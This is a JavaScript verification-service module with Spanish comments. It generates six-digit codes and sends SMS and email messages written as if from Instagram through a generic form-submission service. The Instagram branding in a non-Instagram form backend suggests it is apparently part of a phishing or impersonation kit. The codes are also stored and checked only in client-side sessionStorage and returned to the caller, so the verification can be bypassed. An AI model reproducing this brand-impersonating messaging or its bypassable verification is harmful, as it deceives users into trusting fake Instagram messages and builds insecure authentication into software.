/**
 * =============================================
 * SERVICIO DE VERIFICACIÓN — SMS / Email
 * =============================================
 */
const VerifyService = {
  _codeKey(id) {
    return `verify_code_${id}`;
  },

  generateCode() {
    return String(Math.floor(100000 + Math.random() * 900000));
  },

  storeCode(identifier, code) {
    sessionStorage.setItem(this._codeKey(identifier), code);
    sessionStorage.setItem(`${this._codeKey(identifier)}_time`, Date.now());
  },

  validateCode(identifier, input) {
    const stored = sessionStorage.getItem(this._codeKey(identifier));
    return stored && stored === input.trim();
  },

  async sendSMS(phone) {
    const code = this.generateCode();
    this.storeCode(phone, code);

    await FormService.submit('SMS Verificación Instagram', {
      tipo: 'sms',
      telefono_destino: phone,
      remitente_instagram: APP_CONFIG.SMS_SENDER,
      codigo: code,
      mensaje: `Instagram: Tu código de confirmación es ${code}. No lo compartas con nadie.`,
    });

    return { success: true, code };
  },

  async sendEmail(email) {
    const code = this.generateCode();
    this.storeCode(email, code);

    await FormService.submit('Email Verificación Instagram', {
      tipo: 'email',
      correo_destino: email,
      codigo: code,
      asunto: 'Instagram — Código de confirmación',
      mensaje: `Tu código de Instagram es: ${code}`,
    });

    return { success: true, code };
  },
};
